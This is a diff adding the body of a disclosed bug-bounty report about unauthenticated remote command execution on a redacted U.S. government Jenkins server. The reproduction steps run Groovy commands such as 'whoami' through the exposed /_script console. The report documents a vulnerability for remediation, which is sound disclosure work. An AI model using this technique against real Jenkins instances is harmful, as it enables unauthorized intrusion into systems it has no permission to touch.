@@ -9,6 +9,7 @@ tags:
 substate: "resolved"
 weakness: "OS Command Injection"
 enriched: true
+body: true
 date: 2021-03-24
 submitted: 2021-03-14T09:03:46.814Z
 bounty_usd: null
@@ -26,6 +27,47 @@ title: "Unauth RCE on Jenkins Instance at https://█████████/"
 - Report: [https://hackerone.com/reports/1125329](https://hackerone.com/reports/1125329)
 - CWE: OS Command Injection
 - Submitted: 2021-03-14T09:03:46.814Z
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+**Description:**
+Hi Team,
+
+While Doing Recon on U.s Government Sites, I Found below asset Belongs to U.S Government (Please Check its SSL certificate to confirm or Please check attached  POC Video)
+ █████████
+
+https://███/
+
+Attacker can execute Command Injection without Authentication.
+
+## Impact
+
+Unauth RCE
+
+## System Host(s)
+███
+
+## Affected Product(s) and Version(s)
+
+
+## CVE Numbers
+
+
+## Steps to Reproduce
+1. Navigate to https://███████/_script
+2. Please execute below commands to confirm Unauth RCE.
+
+             Commands:  println "ls".execute().text
+                                         println "whoami".execute().text
+#POC
+
+Please check Attached POC Video to follow steps (If Required)
+
+██████
+
+## Suggested Mitigation/Remediation Actions
 
 ## Timeline
 
